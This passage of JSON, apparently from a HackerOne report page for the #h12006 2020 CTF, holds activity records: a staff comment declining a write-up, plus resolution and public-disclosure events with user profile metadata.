irXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4a10881418f272e8ca8c7264b6aa6eca780c791cbe21717d6ae189d2141489a9"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8268306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:02:59.721Z","updated_at":"2020-06-11T23:02:59.721Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324973,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:28:22.039Z","updated_at":"2020-06-17T22:28:22.039Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"jeti","url":"/jeti"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8327734,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T05:52:48.538Z","updated_at":"2020-06-18T05:52:48.538Z","first_to_agree":true,"actor":{"username":"jeti","cleared":false,"url":"/jeti","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332803,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T15:29:49.461Z","updated_at":"2020-06-18T15:29:49.461Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332804,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-18T15:29:49.559Z","updated_at":"2020-06-18T15:29:49.559Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}